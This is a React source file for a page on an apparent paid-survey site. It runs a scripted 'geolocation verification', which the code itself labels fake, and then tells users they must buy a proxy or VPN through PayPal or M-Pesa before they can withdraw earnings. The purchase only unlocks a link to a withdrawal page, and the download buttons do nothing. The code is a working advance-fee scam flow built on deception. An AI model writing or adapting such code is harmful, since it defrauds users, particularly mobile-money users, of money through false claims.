import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import "../styles/GeoWarning.css";

import dcProxyImg from "../assets/us-proxy.png";
import resProxyImg from "../assets/residential-proxy.png";
import catoVpnImg from "../assets/cato-vpn.png";

export default function GeoWarning() {
  const navigate = useNavigate();

  const RATE = 125; // USD to KES

  const [checking, setChecking] = useState(true);
  const [stepIndex, setStepIndex] = useState(0);
  const [purchasedProxy, setPurchasedProxy] = useState(null);

  const [stkModal, setStkModal] = useState(false);
  const [stkStatus, setStkStatus] = useState("idle"); // idle, processing, pending, success, failed
  const [checkout, setCheckout] = useState(null);
  const [transactionRef, setTransactionRef] = useState(null);
  const [phone, setPhone] = useState("");

  const steps = [
    "Obtaining IP address…",
    "Checking geolocation…",
    "Verifying region eligibility…",
    "Verification completed",
  ];

  /* -------- Fake verification -------- */
  useEffect(() => {
    const t = setInterval(() => {
      setStepIndex((i) => (i < steps.length - 1 ? i + 1 : i));
    }, 1500);

    setTimeout(() => {
      setChecking(false);
      clearInterval(t);
    }, 7000);

    return () => clearInterval(t);
  }, []);

  /* -------- PayPal buttons -------- */
  useEffect(() => {
    if (window.paypal) return;
    const script = document.createElement("script");
    script.src =
      "https://www.paypal.com/sdk/js?client-id=Abvr9JQwh4aABOQkIoz7Dn8kcjEaPHlDV49WPqUUR3YfKSvqYF5TBcQj6WiqsAFajtSudQfHugP0tbz8&currency=USD";
    script.async = true;
    script.onload = () => {
      const buttons = [
        { id: "paypal-5", amount: "5.00", type: "dc" },
        { id: "paypal-10", amount: "10.00", type: "residential" },
        { id: "paypal-2-5", amount: "2.50", type: "cato" },
      ];
      buttons.forEach(({ id, amount, type }) => {
        window.paypal.Buttons({
          createOrder: (_, actions) =>
            actions.order.create({ purchase_units: [{ amount: { value: amount } }] }),
          onApprove: (_, actions) =>
            actions.order.capture().then(() => setPurchasedProxy(type)),
        }).render(`#${id}`);
      });
    };
    document.body.appendChild(script);
  }, []);

  /* -------- STK Push -------- */
  const handleSTKPush = async () => {
    if (!phone || !checkout) return alert("Enter phone number and select a product");
    setStkStatus("processing");
    setStkModal(true);

    const txRef = `proxy_${checkout.type}_${Date.now()}`;
    setTransactionRef(txRef);

    try {
      const res = await fetch(
        "https://usaas-survey-bc.onrender.com/api/payhero/create",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            phone,
            product: checkout.type,
            reference: txRef,
          }),
        }
      );
      const data = await res.json();

      if (!data.success) throw new Error("STK initiation failed");

      setStkStatus("pending");

      /* -------- Poll payment status -------- */
      const poll = setInterval(async () => {
        try {
          const statusRes = await fetch(
            `https://usaas-survey-bc.onrender.com/api/payments/status/${txRef}`
          );
          const statusData = await statusRes.json();

          if (statusData.status === "success") {
            setStkStatus("success");
            setPurchasedProxy(checkout.type);
            clearInterval(poll);
          }
          if (statusData.status === "failed") {
            setStkStatus("failed");
            clearInterval(poll);
          }
        } catch {
          setStkStatus("failed");
          clearInterval(poll);
        }
      }, 4000);

    } catch (err) {
      console.error("STK ERROR:", err);
      setStkStatus("failed");
    }
  };

  const handleProceedWithdraw = () => {
    if (!purchasedProxy) return alert("Purchase a proxy first");
    navigate("/withdrawp");
  };

  const DownloadLink = () =>
    purchasedProxy ? (
      <button className="download-link active">⬇ Download</button>
    ) : (
      <span className="download-link locked">Locked</span>
    );

  const calcKES = checkout ? Math.round(checkout.usd * RATE) : 0;

  return (
    <div className="geo-page">
      <div className="geo-card">
        {checking && (
          <div className="checking-overlay">
            <div className="checking-box">
              <div className="spinner" />
              <p>{steps[stepIndex]}</p>
            </div>
          </div>
        )}

        <div className={`geo-content ${checking ? "blurred" : ""}`}>
          <h1>⚠ Purchase Proxy to Withdraw</h1>

          <div className="proxy-list">
            {/* Datacenter */}
            <div className="proxy-card">
              <img src={dcProxyImg} alt="Datacenter Proxy" />
              <DownloadLink />
              <h3>Datacenter Proxy</h3>
              <p>$5 (~KES {5 * RATE})</p>
              <div id="paypal-5" />
              <button
                className="stk-btn"
                onClick={() => setCheckout({ type: "dc", usd: 5 })}
              >
                Pay with M-Pesa
              </button>
            </div>

            {/* Residential */}
            <div className="proxy-card premium">
              <img src={resProxyImg} alt="Residential Proxy" />
              <DownloadLink />
              <h3>Residential Proxy</h3>
              <p>$10 (~KES {10 * RATE})</p>
              <div id="paypal-10" />
              <button
                className="stk-btn"
                onClick={() => setCheckout({ type: "residential", usd: 10 })}
              >
                Pay with M-Pesa
              </button>
            </div>

            {/* Cato VPN */}
            <div className="proxy-card vpn">
              <img src={catoVpnImg} alt="Cato VPN" />
              <DownloadLink />
              <h3>Cato VPN</h3>
              <p>$2.5 (~KES {2.5 * RATE})</p>
              <div id="paypal-2-5" />
              <button
                className="stk-btn"
                onClick={() => setCheckout({ type: "cato", usd: 2.5 })}
              >
                Pay with M-Pesa
              </button>
            </div>
          </div>

          {!checking && (
            <button className="proceed-withdraw-btn" onClick={handleProceedWithdraw}>
              Proceed & Withdraw
            </button>
          )}
        </div>
      </div>

      {/* STK PAYMENT MODAL */}
      {stkModal && checkout && (
        <div className="stk-modal-overlay">
          <div className="stk-modal">
            <h2>
              {stkStatus === "processing" && "⏳ Processing payment..."}
              {stkStatus === "pending" && "📲 Check your phone and enter PIN"}
              {stkStatus === "success" && "✅ Payment Successful!"}
              {stkStatus === "failed" && "❌ Payment Failed"}
            </h2>

            {stkStatus === "pending" && (
              <p>Amount: KES {calcKES}</p>
            )}

            {(stkStatus === "processing" || stkStatus === "pending") && (
              <div className="spinner" />
            )}

            <input
              type="tel"
              placeholder="2547XXXXXXXX"
              value={phone}
              onChange={(e) => setPhone(e.target.value)}
              disabled={stkStatus !== "idle" && stkStatus !== "failed"}
            />

            {(stkStatus === "idle" || stkStatus === "failed") && (
              <button className="pay-now-btn" onClick={handleSTKPush}>
                Pay Now
              </button>
            )}

            {(stkStatus === "success" || stkStatus === "failed") && (
              <button className="close-btn" onClick={() => {setStkModal(false); setCheckout(null); setStkStatus("idle");}}>
                Close
              </button>
            )}
          </div>
        </div>
      )}
    </div>
  );
}
